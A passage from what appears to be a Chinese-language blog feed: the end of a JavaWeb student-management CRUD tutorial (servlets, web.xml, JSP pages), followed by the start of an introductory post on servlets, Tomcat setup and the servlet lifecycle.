HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Vector&lt;Student&gt; students=StudentDao.getAllStudent();</span><br><span class="line">            request.getSession().setAttribute(<span class="string">&quot;students&quot;</span>, students);</span><br><span class="line">            response.sendRedirect(<span class="string">&quot;index.jsp&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span>  </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>SearchServlet</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> servlets;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> dao.StudentDao;</span><br><span class="line"><span class="keyword">import</span> model.Student;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Servlet implementation class SearchServlet</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/SearchServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SearchServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#HttpServlet()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SearchServlet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Student one=StudentDao.getOneStudent(request.getParameter(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">            request.getSession().setAttribute(<span class="string">&quot;one&quot;</span>, one);</span><br><span class="line">            response.sendRedirect(<span class="string">&quot;update.jsp&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>UpdateServlet</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> servlets;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> dao.StudentDao;</span><br><span class="line"><span class="keyword">import</span> model.Student;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Servlet implementation class UpdateServlet</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/UpdateServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UpdateServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#HttpServlet()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UpdateServlet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Student student=StudentDao.getOneStudent(request.getParameter(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">            request.getSession().setAttribute(<span class="string">&quot;one&quot;</span>, student);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        request.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        Student student=<span class="keyword">new</span> Student();</span><br><span class="line">        student.setStuNo(request.getParameter(<span class="string">&quot;stuNo&quot;</span>));</span><br><span class="line">        student.setName(request.getParameter(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">        student.setSex(request.getParameter(<span class="string">&quot;sex&quot;</span>));</span><br><span class="line">        student.setBirthday(request.getParameter(<span class="string">&quot;birthday&quot;</span>));</span><br><span class="line">        student.setPro(request.getParameter(<span class="string">&quot;pro&quot;</span>));</span><br><span class="line">        student.setSalary(Integer.parseInt(request.getParameter(<span class="string">&quot;salary&quot;</span>)));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            StudentDao.updateOneStudent(student);</span><br><span class="line">            Vector&lt;Student&gt; students=StudentDao.getAllStudent();</span><br><span class="line">            request.getSession().setAttribute(<span class="string">&quot;students&quot;</span>, students);</span><br><span class="line">            response.sendRedirect(<span class="string">&quot;index.jsp&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>web.xml</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;web-app xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">         xmlns=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;http://java.sun.com/xml/ns/javaee</span></span><br><span class="line"><span class="string"> http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span></span><br><span class="line">         id=<span class="string">&quot;WebApp_ID&quot;</span> version=<span class="string">&quot;3.0&quot;</span>&gt;</span><br><span class="line">  &lt;display-name&gt;Work&lt;/display-name&gt;</span><br><span class="line">  &lt;welcome-file-list&gt;</span><br><span class="line">    &lt;welcome-file&gt;InitServlet&lt;/welcome-file&gt;</span><br><span class="line">  &lt;/welcome-file-list&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
<p>index.jsp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span></span><br><span class="line">         pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ taglib uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> prefix=<span class="string">&quot;c&quot;</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;fmt&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jstl/fmt&quot;</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;主页&lt;/title&gt;</span><br><span class="line">    &lt;link type=<span class="string">&quot;text/css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>  href=<span class="string">&quot;css/style.css&quot;</span> /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;table border=<span class="string">&quot;2&quot;</span>&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;学号&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;姓名&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;性别&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;出生年月&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;专业&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;奖学金&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;操作&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;c:forEach items=<span class="string">&quot;$&#123;students&#125;&quot;</span> <span class="keyword">var</span>=<span class="string">&quot;student&quot;</span>&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;$&#123;student.stuNo&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$&#123;student.name&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$&#123;student.sex&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$&#123;student.birthday&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$&#123;student.pro&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$&#123;student.salary&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;a href=DeleteServlet?id=$&#123;student.stuNo&#125;&gt;删除&lt;/a&gt;</span><br><span class="line">                &lt;a href=SearchServlet?id=$&#123;student.stuNo&#125;&gt;修改&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    &lt;/c:forEach&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;form action=<span class="string">&quot;AddServlet&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;stuNo&quot; placeholder=&quot;学号&quot; /&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;name&quot; placeholder=&quot;姓名&quot; /&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;select name=<span class="string">&quot;sex&quot;</span>&gt;</span><br><span class="line">                &lt;option value=&quot;男&quot;&gt;男&lt;/option&gt;</span><br><span class="line">                &lt;option value=&quot;女&quot;&gt;女&lt;/option&gt;</span><br><span class="line">            &lt;/select&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=&quot;date&quot; name=&quot;birthday&quot; /&gt;&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">            &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;pro&quot; placeholder=&quot;专业&quot;/&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=&quot;number&quot; name=&quot;salary&quot; placeholder=&quot;奖学金&quot; /&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=&quot;submit&quot; value=&quot;添加&quot; /&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>update.jsp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span></span><br><span class="line">         pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ taglib uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> prefix=<span class="string">&quot;c&quot;</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;修改&lt;/title&gt;</span><br><span class="line">    &lt;link type=<span class="string">&quot;text/css&quot;</span> rel=<span class="string">&quot;styleSheet&quot;</span>  href=<span class="string">&quot;css/style.css&quot;</span> /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=UpdateServlet?stuNo=$&#123;one.stuNo&#125; method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;table border=<span class="string">&quot;1&quot;</span>&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;修改前&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;修改后&lt;/th&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;姓名&lt;/th&gt;</span><br><span class="line">            &lt;td&gt; $&#123;one.name&#125; &lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;性别&lt;/th&gt;</span><br><span class="line">            &lt;td&gt; $&#123;one.sex&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;select name=<span class="string">&quot;sex&quot;</span>&gt;</span><br><span class="line">                &lt;option value=&quot;男&quot;&gt;男&lt;/option&gt;</span><br><span class="line">                &lt;option value=&quot;女&quot;&gt;女&lt;/option&gt;</span><br><span class="line">            &lt;/select&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;出生日期&lt;/th&gt;</span><br><span class="line">            &lt;td&gt; $&#123;one.birthday&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=&quot;date&quot; name=&quot;birthday&quot;&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;专业&lt;/th&gt;</span><br><span class="line">            &lt;td&gt; $&#123;one.pro&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;pro&quot;&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;奖学金&lt;/th&gt;</span><br><span class="line">            &lt;td&gt; $&#123;one.salary&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=&quot;number&quot; name=&quot;salary&quot;&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;操作&lt;/th&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;返回&quot;</span> onclick=<span class="string">&quot;window.location.href=&#x27;index.jsp&#x27;&quot;</span>&gt;</span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=&quot;submit&quot; value=&quot;保存&quot;&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    &lt;/table&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>以下是所用依赖</p>
<p><img src="https://s3.ax1x.com/2020/12/13/reDeEV.jpg" alt="reDeEV.jpg"></p>
<h1 id="访问项目"><a href="#访问项目" class="headerlink" title="访问项目"></a>访问项目</h1><p><img src="https://s3.ax1x.com/2020/12/13/reDVH0.jpg" alt="reDVH0.jpg" style="zoom:67%;" /></p>
]]></content>
      <categories>
        <category>JavaWeb学习</category>
      </categories>
      <tags>
        <tag>Servlet</tag>
      </tags>
  </entry>
  <entry>
    <title>Sevlet编程</title>
    <url>/post/26db735a.html</url>
    <content><![CDATA[<p>　　对Servlet学的总结<span id="more"></span></p>
<h1 id="Servlet简介"><a href="#Servlet简介" class="headerlink" title="Servlet简介"></a>Servlet简介</h1><h2 id="1-Servlet是什么"><a href="#1-Servlet是什么" class="headerlink" title="1.Servlet是什么"></a>1.Servlet是什么</h2><p>　　Java Servlet是运行在web服务器或应用服务器上的程序，他是作为来自Web浏览器或其他HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层。使用Servlet，可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。</p>
<p>　　Java Servlet 通常情况下与使用 CGI（Common Gateway Interface，公共网关接口）实现的程序可以达到异曲同工的效果。但是相比于 CGI，Servlet 有以下几点优势：</p>
<ul>
<li>性能明显更好。</li>
<li>Servlet 在 Web 服务器的地址空间内执行。这样它就没有必要再创建一个单独的进程来处理每个客户端请求。</li>
<li>Servlet 是独立于平台的，因为它们是用 Java 编写的。</li>
<li>服务器上的 Java 安全管理器执行了一系列限制，以保护服务器计算机上的资源。因此，Servlet 是可信的。</li>
<li>Java 类库的全部功能对 Servlet 来说都是可用的。它可以通过 sockets 和 RMI 机制与 applets、数据库或其他软件进行交互。</li>
</ul>
<h2 id="2-Servlet架构"><a href="#2-Servlet架构" class="headerlink" title="2.Servlet架构"></a>2.Servlet架构</h2><p>这个图显示了Servlet在Web应用程序中的位置。</p>
<p><img src="https://www.runoob.com/wp-content/uploads/2014/07/servlet-arch.jpg" alt=""></p>
<h1 id="Servlet环境设置"><a href="#Servlet环境设置" class="headerlink" title="Servlet环境设置"></a>Servlet环境设置</h1><p><strong>以下两个环境变量配置都必须配置，不然出现闪退！！！</strong></p>
<h2 id="1-java开发工具包"><a href="#1-java开发工具包" class="headerlink" title="1.java开发工具包"></a>1.java开发工具包</h2><p>　　也就是JDK的环境配置，但是要是用JAVA_HOME的配置方法，详情：<a href="/post/a1cef01a.html" title="java环境变量配置">java环境变量配置</a></p>
<h2 id="2-设置Web服务器：tomcat"><a href="#2-设置Web服务器：tomcat" class="headerlink" title="2.设置Web服务器：tomcat"></a>2.设置Web服务器：tomcat</h2><p>1.在官网下载tomcat</p>
<p>2.tomcat的环境变量</p>
<p>在系统变量中新建下面两个变量</p>
<ul>
<li><p>CATALINA_BASE     <strong>tomcat安装目录</strong></p>
<p><img src="https://s3.ax1x.com/2020/11/15/DiAy7Q.jpg" alt="DiAy7Q.jpg"></p>
</li>
</ul>
<ul>
<li>CATALINA_HOME   <strong>tomcat安装目录</strong></li>
</ul>
<p><img src="https://s1.ax1x.com/2020/11/10/BqK3FO.md.jpg" alt="BqK3FO.md.jpg" style="zoom:67%;" /></p>
<p>3.打开CLASSPATH的变量值（如果没有就新建）</p>
<p>在CLASSPATH中加入<code>%CATALINA_HOME%\lib\servlet-api.jar;</code></p>
<p><img src="https://s3.ax1x.com/2020/11/15/DiAs0g.jpg" alt="DiAs0g.jpg"></p>
<p>4.在path变量中添加</p>
<p>%CATALINA_HOME%\lib;%CATALINA_HOME%\bin;</p>
<p><img src="https://s3.ax1x.com/2020/11/13/DSxsVU.png" alt="DSxsVU.png" style="zoom:67%;" /></p>
<p>进入tomcat安装目录下的bin目录：</p>
<ul>
<li><p>双击startup.bat</p>
<p>启动成功如下：</p>
<p><img src="https://s3.ax1x.com/2020/11/13/DSxCg1.jpg" style="zoom:67%;" /></p>
</li>
<li><p>在浏览器地址栏中输入<a href="http://localhost:8080">http://localhost:8080</a></p>
</li>
<li><p>shutdown.bat    关闭tomcat</p>
</li>
</ul>
<p><strong>如果启动startup是乱码，解决方法：</strong></p>
<p>找到tomcat目录下的conf目录，打开“logging.properties”文件，用记事本打开，找到如下配置项：</p>
<p>java.util.logging.ConsoleHandler.encoding = <strong>UTF-8</strong></p>
<p>将 UTF-8 修改为 GBK，修改后的效果为：</p>
<p>java.util.logging.ConsoleHandler.encoding = <strong>GBK</strong></p>
<p>保存后，重启tomcat！</p>
<h2 id="3-IDEA配置Tomcat"><a href="#3-IDEA配置Tomcat" class="headerlink" title="3.IDEA配置Tomcat"></a>3.IDEA配置Tomcat</h2><p>1.点击Run-Edit Configurations…</p>
<p><img src="https://s3.ax1x.com/2020/11/15/DiAtkd.jpg" alt="DiAtkd.jpg"></p>
<p>2.点击左侧“+”，选择Tomcat Server—Local</p>
<p><img src="https://s3.ax1x.com/2020/11/15/DiAG0e.jpg" alt="DiAG0e.jpg" style="zoom:67%;" /></p>
<p>3.在Tomcat Server -&gt; Unnamed -&gt; Server -&gt; Application server项目下，点击 Configuration ，找到本地 Tomcat 服务器，再点击 OK按钮。</p>
<p><img src="https://s3.ax1x.com/2020/11/15/DiANtA.md.jpg" alt="DiANtA.md.jpg" style="zoom:80%;" /></p>
<h1 id="Servlet生命周期"><a href="#Servlet生命周期" class="headerlink" title="Servlet生命周期"></a>Servlet生命周期</h1><p>它的声明周期可被定义为从创建直到毁灭的过程。以下下是Servlet遵循的过程：</p>
<ul>
<li>Servlet初始化后调用init()方法</li>
<li>Servlet调用service()方法来处理客户端请求</li>
<li>Servlet销毁前调用destroy()方法</li>
<li>最后，Servlet由JVM的垃圾回收器进行垃圾回收</li>
</ul>
<h2 id="1-init-方法"><a href="#1-init-方法" class="headerlink" title="1.init()方法"></a>1.init()方法</h2><p>只调用一次，一次性初始化。init()方法简单地创建或家在一些数据，这些数据将被用于servlet的整个生命周期。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException</span>&#123;</span><br><span class="line">	<span class="comment">//初始化代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-service-方法"><a href="#2-service-方法" class="headerlink" title="2.service()方法"></a>2.service()方法</h2><p>web容器调用service()方法来处理浏览器的请求，并把格式化的响应写回浏览器。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest request, </span></span></span><br><span class="line"><span class="function"><span class="params">                    ServletResponse response)</span> </span></span><br><span class="line"><span class="function">      <span class="keyword">throws</span> ServletException, IOException</span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>service方法适当的时候回调用doGet、doPost、doPut、doDelete方法，只用根据客户端的请求类型来重写doGet和doPost方法。</p>
<h3 id="doGet-方法"><a href="#doGet-方法" class="headerlink" title="doGet() 方法"></a>doGet() 方法</h3><p>GET 请求来自于一个 URL 的正常请求，或者来自于一个未指定 METHOD 的 HTML 表单，它由 doGet() 方法处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                  HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    <span class="comment">// Servlet 代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="doPost-方法"><a href="#doPost-方法" class="headerlink" title="doPost() 方法"></a>doPost() 方法</h3><p>POST 请求来自于一个特别指定了 METHOD 为 POST 的 HTML 表单，它由 doPost() 方法处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                   HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    <span class="comment">// Servlet 代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3-destroy-方法"><a href="#3-destroy-方法" class="headerlink" title="3.destroy()方法"></a>3.destroy()方法</h2><p>也只调用一次，在servlet生命周期结束的时候被调用。这个方法可以关闭数据库连接、停止后台线程、把cookie列表或点击计数器写到磁盘等。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 终止化代码...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="4-架构图"><a href="#4-架构图" class="headerlink" title="4.架构图"></a>4.架构图</h2><p>下图显示了一个典型的 Servlet 生命周期方案。</p>
<ul>
<li>第一个到达服务器的 HTTP 请求被委派到 Servlet 容器。</li>
<li>Servlet 容器在调用 service() 方法之前加载 Servlet。</li>
<li>然后 Servlet 容器处理由多个线程产生的多个请求，每个线程执行一个单一的 Servlet 实例的 service() 方</li>
</ul>
<p><img src="https://www.runoob.com/wp-content/uploads/2014/07/Servlet-LifeCycle.jpg" alt=""></p>
<h1 id="Servlet实例"><a href="#Servlet实例" class="headerlink" title="Servlet实例"></a>Servlet实例</h1><h2 id="1-如何新建Servlet项目"><a href="#1-如何新建Servlet项目" class="headerlink" title="1.如何新建Servlet项目"></a>1.如何新建Servlet项目</h2><p>参考链接：<a href="https://www.cnblogs.com/liusong-funtime/p/9144275.html">https://www.cnblogs.com/liusong-funtime/p/9144275.html</a></p>
<h2 id="2-servlet第一个程序"><a href="#2-servlet第一个程序" class="headerlink" title="2.servlet第一个程序"></a>2.servlet第一个程序</h2><p>Servlet类：服务HTTP请求并实现javax.servlet.Servlet接口的类。</p>
